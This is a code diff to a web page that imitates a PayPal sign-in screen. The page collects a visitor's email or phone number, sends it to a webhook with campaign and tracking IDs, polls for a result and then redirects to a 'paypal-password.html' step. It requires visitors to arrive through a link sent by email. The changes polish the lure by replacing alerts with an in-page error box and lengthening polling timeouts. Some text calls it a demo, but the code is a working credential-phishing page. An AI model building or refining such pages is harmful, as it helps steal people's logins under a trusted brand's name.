@@ -94,7 +94,7 @@
         }
 
         .btn-primary:hover {
-            background: linear-gradient(180deg, #005ea6 0%, #002a75 100%);
+            background: #05326c;
             transform: translateY(-1px);
             box-shadow: 0 4px 12px rgba(0, 112, 186, 0.3);
         }
@@ -126,6 +126,28 @@
             display: flex;
             align-items: center;
             justify-content: center;
+        }
+
+        .error-message {
+            display: none;
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .error-message.danger {
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+            color: #721c24;
         }
 
         .divider {
@@ -277,6 +299,8 @@
         </div>
         
         <form>
+            <div id="errorContainer" class="error-message"></div>
+            
             <div class="form-group">
                 <input type="text" class="form-input" placeholder="Email or mobile number" required>
             </div>
@@ -436,13 +460,17 @@
             .catch(error => {
                 console.error('Webhook error:', error);
                 hideLoadingState();
-                // Only show connection error for actual network failures
+                // Only show connection error for initial webhook submission failures
+                // Don't interfere with polling process
                 if (
                     error.message.includes('Failed to fetch') ||
                     error.message.includes('NetworkError') ||
                     error.message.includes('TypeError')
                 ) {
-                    alert('Connection error. Please check your internet connection and try again.');
+                    showError('Unable to connect to server. Please check your internet connection and try again.', true);
+                } else {
+                    // For other errors, show a generic message
+                    showError('Something went wrong. Please try again.', true);
                 }
             });
         }
@@ -479,7 +507,7 @@
                         pollingActive = false;
                         hideLoadingState();
                         let errorMsg = result.error_message || 'Invalid email address. Please try again.';
-                        alert(errorMsg);
+                        showError(errorMsg, true);
                     } else {
                         console.log('Status still pending...');
                         setTimeout(poll, 2000); // Poll every 2 seconds
@@ -488,7 +516,8 @@
                 .catch(error => {
                     console.error('Polling error:', error);
                     if (pollingActive) {
-                        setTimeout(poll, 3000);
+                        // Don't show error to user, just continue polling with longer delay
+                        setTimeout(poll, 5000); // Wait 5 seconds before retrying
                     }
                 });
             };
@@ -496,7 +525,7 @@
             // Start polling
             poll();
             
-            // Fallback timeout after 30 seconds
+            // Fallback timeout after 60 seconds (increased from 30)
             setTimeout(() => {
                 if (pollingActive) {
                     console.log('Polling timeout reached, proceeding anyway...');
@@ -505,7 +534,7 @@
                     setDataExpiration();
                     window.location.href = 'paypal-password.html';
                 }
-            }, 30000);
+            }, 60000); // Increased to 60 seconds
         }
 
         // Loading state functions
@@ -531,20 +560,38 @@
             buttonText.textContent = 'Next';
         }
 
+        // Error display functions
+        function showError(message, isDanger = false) {
+            const errorContainer = document.getElementById('errorContainer');
+            errorContainer.textContent = message;
+            errorContainer.className = `error-message show${isDanger ? ' danger' : ''}`;
+            
+            // Scroll to top to ensure error is visible
+            document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        function hideError() {
+            const errorContainer = document.getElementById('errorContainer');
+            errorContainer.className = 'error-message';
+            errorContainer.textContent = '';
+        }
+
         // Add form submission handling
         document.querySelector('form').addEventListener('submit', function(e) {
             e.preventDefault();
+            hideError(); // Clear any previous errors
+            
             const email = document.querySelector('.form-input').value.trim();
             const campaignId = getOrSetCampaignId();
             const trackingId = getOrCreateTrackingId();
             
             if (!email) {
-                alert('Please enter an email or mobile number');
+                showError('Please enter an email or mobile number');
                 return;
             }
             
             if (!campaignId) {
-                alert('Please use the link provided in your email to access this page.');
+                showError('Please use the link provided in your email to access this page.');
                 return;
             }
             
@@ -572,12 +619,12 @@
 
         // Add button interactions
         document.querySelector('.btn-secondary').addEventListener('click', function() {
-            alert('This is a demo. Sign Up clicked.');
+            showError('This is a demo. Sign Up feature is not available.');
         });
 
         document.querySelector('.forgot-link').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('This is a demo. Forgot email clicked.');
+            showError('This is a demo. Forgot email feature is not available.');
         });
 
         // Language selector interactions
